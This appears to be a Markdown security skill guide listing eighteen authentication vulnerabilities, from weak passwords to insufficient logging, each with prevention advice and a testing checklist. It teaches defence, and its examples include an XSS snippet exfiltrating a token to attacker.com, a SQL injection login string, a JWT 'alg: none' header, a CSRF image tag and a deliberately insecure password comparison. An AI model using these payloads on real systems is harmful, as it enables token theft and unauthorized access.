# Identify Common Authentication Security Risks

## Purpose
Guide the identification and understanding of common authentication security vulnerabilities to prevent security breaches.

## Skill Description
This skill provides knowledge of common authentication security risks, how they occur, and how to prevent them.

## Common Authentication Vulnerabilities

### 1. Weak Password Policies

**Risk**: Users create easily guessable passwords

**Examples**:
- "password123"
- "admin"
- "123456"
- User's name or birthday

**Impact**:
- Brute force attacks succeed
- Dictionary attacks work
- Account takeover

**Prevention**:
- Minimum length (8+ characters)
- Complexity requirements
- Password strength meter
- Common password blacklist
- Password history (prevent reuse)

### 2. No Rate Limiting

**Risk**: Unlimited login attempts allowed

**Attack**: Brute force attack
```
Attacker tries:
- password1
- password2
- password3
... (thousands of attempts)
```

**Impact**:
- Account compromise
- Service degradation
- Resource exhaustion

**Prevention**:
- Limit login attempts (5-10 per hour)
- Progressive delays after failures
- Account lockout after threshold
- CAPTCHA after failures
- IP-based rate limiting

### 3. Insecure Token Storage

**Risk**: Tokens stored insecurely on client

**Vulnerable Storage**:
- LocalStorage (accessible to JavaScript)
- SessionStorage (accessible to JavaScript)
- Cookies without HttpOnly flag
- URL parameters
- Browser history

**Attack**: Cross-Site Scripting (XSS)
```javascript
// Attacker injects script
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Prevention**:
- HttpOnly cookies (not accessible to JavaScript)
- Secure flag (HTTPS only)
- SameSite flag (CSRF protection)
- Short token lifetimes
- Token encryption

### 4. Missing HTTPS

**Risk**: Credentials sent over unencrypted connection

**Attack**: Man-in-the-Middle (MITM)
```
User → HTTP → Attacker → Server
         ↑
    Attacker intercepts
    username and password
```

**Impact**:
- Credentials stolen
- Tokens intercepted
- Session hijacking

**Prevention**:
- Always use HTTPS
- HSTS headers
- Redirect HTTP to HTTPS
- Certificate validation

### 5. Weak JWT Secrets

**Risk**: JWT secret is short or predictable

**Vulnerable Secrets**:
- "secret"
- "myapp"
- Short strings (< 32 characters)
- Dictionary words

**Attack**: JWT forgery
```
1. Attacker guesses weak secret
2. Creates fake JWT with admin role
3. Signs with guessed secret
4. Gains unauthorized access
```

**Prevention**:
- Strong, random secrets (256+ bits)
- Cryptographically secure generation
- Environment variables
- Regular rotation

### 6. Algorithm Confusion Attack

**Risk**: JWT algorithm can be changed to "none"

**Attack**:
```json
// Attacker modifies header
{
  "alg": "none",
  "typ": "JWT"
}

// No signature required
// Server accepts if not validating algorithm
```

**Impact**:
- Token forgery
- Unauthorized access
- Privilege escalation

**Prevention**:
- Whitelist allowed algorithms
- Reject "none" algorithm
- Verify algorithm matches expected
- Use strong algorithms (HS256, RS256)

### 7. Missing Token Expiration

**Risk**: Tokens valid indefinitely

**Impact**:
- Stolen tokens work forever
- No way to revoke access
- Increased exposure window

**Prevention**:
- Short access token lifetime (15-60 minutes)
- Always include exp claim
- Validate expiration on every request
- Use refresh tokens for long sessions

### 8. Insecure Password Reset

**Risk**: Password reset process can be exploited

**Vulnerabilities**:
- Predictable reset tokens
- No token expiration
- Token reuse allowed
- Reset link sent to unverified email

**Attack Scenarios**:
```
1. Attacker requests reset for victim's email
2. Guesses or brute forces reset token
3. Resets victim's password
4. Gains account access
```

**Prevention**:
- Cryptographically random tokens
- Short expiration (15-30 minutes)
- Single-use tokens
- Verify email ownership
- Rate limit reset requests

### 9. Session Fixation

**Risk**: Attacker sets victim's session ID

**Attack**:
```
1. Attacker gets session ID from server
2. Tricks victim into using that session ID
3. Victim logs in with attacker's session ID
4. Attacker now has authenticated session
```

**Prevention**:
- Generate new session ID after login
- Invalidate old session on login
- Use secure, random session IDs
- HttpOnly and Secure cookies

### 10. Credential Stuffing

**Risk**: Reused passwords from other breaches

**Attack**:
```
Attacker has list from other breach:
- user1@email.com:password123
- user2@email.com:qwerty

Tries same credentials on your site
```

**Impact**:
- Account takeover
- Data breach
- Reputation damage

**Prevention**:
- Check against breach databases
- Require unique passwords
- Multi-factor authentication
- Monitor for suspicious logins

### 11. Information Leakage

**Risk**: Error messages reveal too much

**Vulnerable Messages**:
- "Invalid password" (reveals username exists)
- "Account locked" (reveals account exists)
- "Email not found" (reveals email doesn't exist)

**Attack**: User enumeration
```
Attacker tests emails:
- test1@email.com → "Invalid password" (exists!)
- test2@email.com → "Email not found" (doesn't exist)

Attacker now has list of valid accounts
```

**Prevention**:
- Generic error messages
- "Invalid email or password" (doesn't reveal which)
- Same response time for valid/invalid
- Rate limiting

### 12. Missing Multi-Factor Authentication

**Risk**: Single factor (password) is only protection

**Impact**:
- Compromised password = full access
- No additional verification
- Higher risk of account takeover

**Prevention**:
- Offer 2FA/MFA
- SMS codes
- Authenticator apps (TOTP)
- Hardware tokens
- Biometric authentication

### 13. Insecure Direct Object Reference (IDOR)

**Risk**: User can access other users' data by changing IDs

**Vulnerable Endpoint**:
```
GET /api/users/123/profile

# No ownership check
# User can access any profile by changing ID
```

**Attack**:
```
User A's ID: 123
User B's ID: 456

User A requests: GET /api/users/456/profile
Server returns User B's data (vulnerability!)
```

**Prevention**:
- Always verify ownership
- Filter by authenticated user
- Use UUIDs instead of sequential IDs
- Return 404 for unauthorized access

### 14. Cross-Site Request Forgery (CSRF)

**Risk**: Attacker tricks user into making unwanted requests

**Attack**:
```html
<!-- Attacker's malicious site -->
<img src="https://yoursite.com/api/delete-account">

<!-- If user is logged in, request succeeds -->
```

**Impact**:
- Unauthorized actions
- Account changes
- Data deletion

**Prevention**:
- CSRF tokens
- SameSite cookie attribute
- Verify Origin/Referer headers
- Require re-authentication for sensitive actions

### 15. SQL Injection in Authentication

**Risk**: Malicious SQL in login form

**Vulnerable Code**:
```sql
SELECT * FROM users
WHERE email = '{user_input}'
AND password = '{password_input}'
```

**Attack**:
```
Email: admin@example.com' OR '1'='1
Password: anything

Resulting query:
SELECT * FROM users
WHERE email = 'admin@example.com' OR '1'='1'
AND password = 'anything'

Returns all users (1=1 is always true)
```

**Prevention**:
- Parameterized queries
- ORM usage
- Input validation
- Prepared statements

### 16. Timing Attacks

**Risk**: Response time reveals information

**Vulnerable**:
```python
def check_password(input_password, stored_hash):
    for i in range(len(input_password)):
        if input_password[i] != stored_hash[i]:
            return False  # Returns immediately
    return True
```

**Attack**: Measure response time to guess password character by character

**Prevention**:
- Constant-time comparison
- Use secure comparison functions
- Add random delays
- Use proper hashing (bcrypt, Argon2)

### 17. Plaintext Password Storage

**Risk**: Passwords stored without hashing

**Impact**:
- Database breach exposes all passwords
- Passwords usable on other sites
- Catastrophic security failure

**Prevention**:
- Never store plaintext passwords
- Use strong hashing (bcrypt, Argon2, scrypt)
- Salt passwords
- Use high work factor

### 18. Insufficient Logging

**Risk**: Security events not logged

**Missing Logs**:
- Failed login attempts
- Password changes
- Account lockouts
- Suspicious activity

**Impact**:
- Can't detect attacks
- Can't investigate breaches
- No audit trail

**Prevention**:
- Log all authentication events
- Include timestamp, IP, user agent
- Monitor for patterns
- Alert on anomalies

## Risk Assessment Matrix

| Vulnerability | Likelihood | Impact | Priority |
|---------------|------------|--------|----------|
| Weak passwords | High | High | Critical |
| No rate limiting | High | High | Critical |
| Missing HTTPS | Medium | Critical | Critical |
| Weak JWT secrets | Medium | High | High |
| No token expiration | High | High | High |
| Insecure storage | Medium | High | High |
| Algorithm confusion | Low | Critical | High |
| IDOR | Medium | High | High |
| Information leakage | High | Medium | Medium |
| Missing 2FA | High | Medium | Medium |

## Security Testing

### Manual Testing

**Test 1: Brute Force**:
- Attempt multiple failed logins
- Verify rate limiting works
- Check account lockout

**Test 2: Token Manipulation**:
- Modify JWT payload
- Change algorithm to "none"
- Use expired token
- Verify all rejected

**Test 3: IDOR**:
- Access other users' resources
- Change IDs in URLs
- Verify ownership checks

**Test 4: Information Leakage**:
- Try invalid usernames
- Try invalid passwords
- Verify generic error messages

### Automated Testing

**Security Scanners**:
- OWASP ZAP
- Burp Suite
- Nikto
- SQLMap

**Penetration Testing**:
- Professional security audit
- Vulnerability assessment
- Exploit verification

## Prevention Checklist

- [ ] Strong password policy enforced
- [ ] Rate limiting on login attempts
- [ ] HTTPS everywhere
- [ ] Strong JWT secrets (256+ bits)
- [ ] Token expiration implemented
- [ ] Secure token storage (HttpOnly cookies)
- [ ] Algorithm whitelist (no "none")
- [ ] Ownership verification on all endpoints
- [ ] Generic error messages
- [ ] CSRF protection
- [ ] SQL injection prevention
- [ ] Password hashing (bcrypt/Argon2)
- [ ] Comprehensive logging
- [ ] Regular security audits
- [ ] Security headers configured

## Best Practices

1. **Defense in Depth**: Multiple security layers

2. **Fail Securely**: Deny by default

3. **Least Privilege**: Minimum necessary access

4. **Regular Updates**: Keep dependencies current

5. **Security Training**: Educate development team

6. **Code Review**: Security-focused reviews

7. **Penetration Testing**: Regular security audits

8. **Incident Response**: Plan for breaches

9. **Monitor Continuously**: Track security events

10. **Stay Informed**: Follow security advisories

## Success Criteria

Secure authentication system:
- No common vulnerabilities present
- Regular security testing
- Comprehensive logging
- Quick incident response
- Continuous monitoring
- Team security awareness

---

**Application**: Use this skill when designing authentication systems, conducting security reviews, or planning security testing for applications.
